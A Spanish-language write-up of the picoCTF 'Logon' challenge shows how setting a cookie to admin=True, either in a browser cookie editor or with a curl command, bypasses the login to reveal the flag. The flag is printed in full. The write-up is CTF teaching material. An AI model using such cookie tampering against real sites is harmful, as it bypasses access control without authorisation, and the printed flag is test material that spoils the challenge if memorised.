# Logon

# Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594`
# Pistas
Hmm it doesn't seem to check anyone's password, except for Joe's?
# Solución

```bash
Solucion 1:

Para acceder a la bandera de este reto se instalo el plugin "cookie editor" para el navegador. 

Al editar la cookie de admin como "True", en lugar de "False", y al acceder con cualquier usuario se mostrará la bandera.

Solución 2:

adalh4ck1ng-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   2847      0 --:--:-- --:--:-- --:--:--  2845
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
adalh4ck1ng-picoctf@webshell:~$
```

# Bandera
picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

# Referencias
https://developer.mozilla.org/es/docs/Web/HTTP
https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)